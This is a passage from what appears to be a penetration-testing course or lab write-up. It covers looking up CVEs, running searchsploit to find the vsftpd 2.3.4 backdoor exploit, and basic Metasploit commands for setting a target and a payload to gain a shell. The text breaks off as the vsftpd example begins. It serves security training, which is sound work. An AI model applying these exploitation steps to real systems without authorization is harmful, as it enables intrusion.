CVEs\n\n*   **Purpose:** Link identified software versions or configurations to known security weaknesses.\n*   **Process:** Take a specific finding (e.g., &quot;vsftpd 2.3.4&quot; from Nmap/Enumeration) and search vulnerability databases.\n\n### Using searchsploit\n\n*   **Tool:** `searchsploit`\n*   **Purpose:** Search the local Exploit-DB repository for exploits and vulnerabilities.\n*   **Command:** `searchsploit vsftpd 2.3.4`\n*   **Syntax/Options:** Just the keywords you&#39;re searching for (software name, version).\n*   **Why Use:** Quickly find known exploits or related CVEs for specific software/versions found during enumeration. It&#39;s available offline.\n*   **Example Output Snippet:**\n    ```\n    ----------------------------------------------------------------- ---------------------------------\n     Exploit Title                                                   |  Path\n    ----------------------------------------------------------------- ---------------------------------\n     vsftpd 2.3.4 - Backdoor Command Execution                       | linux/remote/17491.py\n    ----------------------------------------------------------------- ---------------------------------\n    ```\n*   **Findings:** `searchsploit` found a remote command execution vulnerability (Exploit-DB ID 17491) for vsftpd 2.3.4. This is a high priority finding!\n*   **Screenshot:** `screenshots/target_searchsploit_vsftpd_output.png`\n\n*(... Add sections on using online resources like Exploit-DB website, NVD, and manual checking for common misconfigurations like default credentials or anonymous access.)*\n\n---\n\n## 6. Exploitation\n\n*   **Goal:** Leverage identified vulnerabilities to gain initial access (a shell) on the target system. This is where you use your findings to compromise the system.\n\n### Introduction to Exploitation\n\n*   **Process:** Identify a vulnerability -&gt; Find an exploit -&gt; Configure the exploit (target, payload, listener) -&gt; Execute -&gt; Catch the shell.\n\n### Metasploit Framework Basics\n\n*   **Tool:** `msfconsole`\n*   **Purpose:** Powerful framework for developing and executing exploits.\n*   **Key Commands:**\n    *   `search &lt;keyword&gt;`: Find modules (exploits, payloads, etc.).\n    *   `use &lt;module_path&gt;`: Select a module.\n    *   `show options`: Display required and optional parameters for the selected module.\n    *   `set &lt;option_name&gt; &lt;value&gt;`: Set a parameter (e.g., `set RHOSTS 192.168.1.105`).\n    *   `set PAYLOAD &lt;payload_path&gt;`: Set the payload (what happens *after* exploitation).\n    *   `show payloads`: List compatible payloads for the current exploit.\n    *   `show targets`: List compatible targets for the current exploit.\n    *   `exploit` or `run`: Execute the module.\n\n#### Exploiting vsftpd 2.3.4 (Example)\n\n*   **Vulnerability:** vsftpd 2.3.4 Backdoor (identified in Module 5\n</code></pre>\n\n                </div>\n             </div>\n         "
